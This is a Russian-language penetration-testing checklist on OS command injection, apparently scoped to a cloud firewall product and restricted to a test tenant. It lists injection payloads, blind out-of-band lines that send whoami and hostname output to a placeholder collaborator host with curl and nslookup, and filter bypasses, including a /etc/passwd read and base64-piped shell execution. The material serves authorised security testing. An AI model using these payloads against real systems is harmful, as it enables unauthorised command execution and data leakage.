# Command Injection — PT AF Cloud

## Что ищем
Инъекция команд ОС в функциях консоли, API, control plane.

## Где искать
- Генерация отчётов (вызов `wkhtmltopdf`, `pandoc`, `ffmpeg`)
- Экспорт данных (вызов `curl`, `wget`, `tar`)
- Проверка домена / URL (вызов `dig`, `nslookup`, `whois`, `curl`)
- Импорт правил / конфигов (вызов парсеров)
- Диагностика (ping, traceroute, telnet)
- Интеграции с внешними сервисами (webhook, callback)
- Названия файлов при загрузке (imagemagick, ghostscript)
- GraphQL mutation с параметром, уходящим в shell

## Payload'ы
```
; id
| id
|| id
& id
&& id
$(id)
`id`
%0aid
%0did
\nid
```

## Blind (OOB через Collaborator)
```
; curl http://COLLABORATOR/$(whoami)
; nslookup $(hostname).COLLABORATOR
; ping -c 1 COLLABORATOR
```

## Обходы фильтров
- `${IFS}` вместо пробела: `cat${IFS}/etc/passwd`
- `$@`, `$*` (bash)
- Кодирование: `%0a`, `%0d%0a`
- Base64: `echo aWQ= | base64 -d | sh`
- Через переменные: `a=i;b=d;$a$b`

## Ограничения PT
- **Никаких reverse shell с persistence**
- **Никаких cryptominer'ов**
- **Никаких destructive payload'ов** (`rm -rf`, `dd`)
- PoC — только `id`, `whoami`, `hostname`
- Только в тестовом tenant

## Инструменты
- Burp Collaborator / interactsh
- commix
- Ручной детект

## Чек-лист
- [ ] Найти все места, где ввод уходит в shell
- [ ] Подставить `; id` → увидеть вывод?
- [ ] Blind: `; curl COLLABORATOR`
- [ ] Проверить обходы фильтров (`${IFS}`, `$@`)
- [ ] Проверить генерацию PDF / экспорт / whois
- [ ] Проверить загрузку файлов (imagemagick)

## Не делать
- Не выполнять destructive / persistence / reverse shell
- Не оставлять webshell
- В PoC — только `id`
